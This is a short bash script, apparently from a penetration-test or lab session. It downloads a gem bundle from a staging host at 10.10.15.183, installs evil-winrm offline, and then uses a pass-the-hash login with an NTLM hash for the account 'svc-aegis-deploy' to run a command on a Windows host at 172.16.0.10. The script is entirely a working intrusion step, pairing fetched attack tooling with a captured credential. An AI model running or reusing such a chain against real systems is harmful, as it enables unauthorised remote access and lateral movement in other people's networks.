#!/bin/bash
curl -fsSL -o /tmp/ew_gems.tgz http://10.10.15.183:8090/ew_gems.tgz
rm -rf /tmp/gems && mkdir /tmp/gems && tar -xzf /tmp/ew_gems.tgz -C /tmp/gems
cd /tmp/gems
ls *.gem
gem install --user-install --local little-plugger-*.gem syslog-*.gem rubyzip-2*.gem logging-*.gem multi_json-*.gem 2>&1 | tail -15
gem install --user-install --local winrm-2*.gem winrm-fs-*.gem evil-winrm-*.gem 2>&1 | tee /tmp/gem4.log | tail -20
export PATH="$HOME/.local/share/gem/ruby/3.3.0/bin:$PATH"
export GEM_HOME="$HOME/.local/share/gem/ruby/3.3.0"
evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa -c whoami 2>&1 | tee /tmp/ew4.out
echo EW4_DONE
